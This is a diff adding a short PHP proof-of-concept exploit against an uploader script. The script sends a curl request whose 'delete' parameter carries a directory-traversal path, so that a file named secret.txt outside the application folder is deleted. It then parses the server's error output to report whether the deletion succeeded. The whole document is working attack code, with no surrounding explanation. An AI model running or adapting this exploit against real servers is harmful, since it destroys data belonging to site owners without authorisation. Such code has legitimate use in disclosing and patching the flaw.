@@ -1,0 +1,31 @@
+&lt;?php
+
+$strExistingFile = &quot;files/secret.txt&quot;; //Must exist, resides in /files by default
+$strToDelete = &quot;\..\..\..\secret.txt&quot;; //Designates &#039;secret.txt&#039;, sat one level above the application folder, for deletion
+$strUploadScript = &quot;http://www.example.com/uploader/upload.php&quot;;
+
+$objCurl = curl_init();
+curl_setopt($objCurl, CURLOPT_URL, $strUploadScript.&quot;?delete=&quot;.$strExistingFile.$strToDelete);
+curl_setopt($objCurl, CURLOPT_RETURNTRANSFER, true);
+$strDump = curl_exec($objCurl);
+curl_close($objCurl);
+
+if(strpos($strDump, &quot;No such file or directory&quot;) !== false)
+{
+	echo(&quot;$strToDelete didn&#039;t exist. \n&quot;);
+}
+else if(strpos($strDump, &quot;Permission denied&quot;) !== false)
+{
+	echo(&quot;Permission was denied when deleting $strToDelete. \n&quot;);
+}
+else if(strpos($strDump, &quot;function.unlink&quot;) !== false)
+{
+	echo(&quot;An unexpected error occured when deleting $strToDelete. \n&quot;);
+}
+else
+{
+	echo(&quot;Looks as though deletion of $strToDelete was successful.\n&quot;);
+}
+
+?&gt;
+
